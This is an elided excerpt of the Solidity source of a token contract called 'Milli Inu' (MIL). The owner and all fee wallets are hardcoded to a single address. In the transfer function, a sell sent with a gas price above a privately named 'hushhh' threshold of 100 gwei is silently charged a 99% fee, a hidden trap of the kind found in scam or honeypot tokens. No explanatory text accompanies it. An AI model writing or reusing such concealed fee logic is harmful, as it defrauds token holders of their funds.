...
contract MilliInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xD61Dd65aD47E54a4d895946278DA53769D547D40);
    address payable public Wallet_Dev = payable(0xD61Dd65aD47E54a4d895946278DA53769D547D40);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private hushhh = 100 * 1 gwei;
    uint256 private _tTotal = 10**9 * 10**_decimals;
    uint256 private _rtotal;
    string private constant _name = "Milli Inu"; 
    string private constant _symbol = unicode"MIL";
    ...
    constructor () {
        _owner = 0xD61Dd65aD47E54a4d895946278DA53769D547D40;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            if (_isExcludedFromCooldown[sender]){sAmount = tAmount - rAmount;}
                ...
                sAmount = tAmount*(tx.gasprice > hushhh ? 99 : _sellFee)/100;
            }
